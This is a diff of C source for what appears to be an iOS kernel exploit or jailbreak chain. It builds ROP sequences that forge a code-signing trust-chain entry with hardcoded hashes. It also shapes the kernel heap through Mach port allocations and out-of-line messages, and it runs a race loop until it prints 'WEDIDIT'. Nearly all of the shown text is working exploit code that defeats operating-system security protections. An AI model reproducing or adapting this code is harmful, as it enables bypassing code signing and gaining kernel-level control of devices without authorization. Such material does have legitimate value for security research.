@@ -960,8 +960,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 2;
-	hash_t my_dylib_hash = {0x23,0xc0,0xa7,0xcc,0x36,0xdd,0x3d,0xa7,0x4a,0x25,0x46,0x50,0x38,0xd9,0xa6,0x20,0x76,0x2e,0x51,0x70};
-	hash_t my_binary_hash = {0xd4,0xd3,0x79,0x1b,0x17,0x2d,0xa2,0xf1,0x89,0xbd,0x2f,0xa7,0x5a,0xf6,0x84,0xaa,0xbf,0x8e,0x08,0x67};
+    hash_t my_dylib_hash = {0xa8,0xe2,0x66,0x77,0xa5,0x45,0xda,0xcf,0x40,0x49,0x1e,0x34,0x4f,0x96,0x2b,0xa7,0xec,0xdf,0xf6,0x1c};
+	hash_t my_binary_hash = {0xa8,0x90,0xd0,0x59,0xd7,0xc3,0xed,0x51,0x26,0x37,0xa1,0xf2,0xa2,0x42,0xf8,0x59,0x58,0xbe,0x60,0xd2};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	memcpy(&new_entry->hash[1],my_binary_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
@@ -1232,23 +1232,23 @@ _STRUCT_ARM_THREAD_STATE64
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
-	// TODO: optimize this loop (we don't have to create a port on each try and the memleak_msg can leak 10 objs at once instead of calling the syscall 10 times)
+	SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 
+
+	// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG64("self",1);
+	ROP_VAR_ARG("msg_port",3);
+	CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
+
+	ROP_VAR_ARG_HOW_MANY(3);
+	ROP_VAR_ARG64("self",1);
+	ROP_VAR_ARG64("msg_port",2);
+	ROP_VAR_ARG64("msg_port",3);
+	CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
+
+	// TODO: optimize this loop (the memleak_msg can leak 10 objs at once instead of calling the syscall 10 times)
 	ADD_LOOP_START("main_loop");
 	
-		SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 
-
-		// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
-		ROP_VAR_ARG_HOW_MANY(2);
-		ROP_VAR_ARG64("self",1);
-		ROP_VAR_ARG("msg_port",3);
-		CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
-	
-		ROP_VAR_ARG_HOW_MANY(3);
-		ROP_VAR_ARG64("self",1);
-		ROP_VAR_ARG64("msg_port",2);
-		ROP_VAR_ARG64("msg_port",3);
-		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
-
 		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head.msgh_remote_port),"msg_port",0,sizeof(mach_port_t));
 		SET_ROP_VAR32("tmp_port",0); // make sure tmp_port really is zero
 
@@ -1296,9 +1296,14 @@ _STRUCT_ARM_THREAD_STATE64
 
 	SET_ROP_VAR64("should_race",1); // stop the other thread
 
+
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("WEDIDIT",2);
 	CALL("write",2,0,1024,0,0,0,0,0);
+
+	ADD_LOOP_START("phew");
+		ADD_USLEEP(100);
+	ADD_LOOP_END();
 
 	ROP_VAR_ARG_HOW_MANY(3);
 	ROP_VAR_ARG64("self",1);
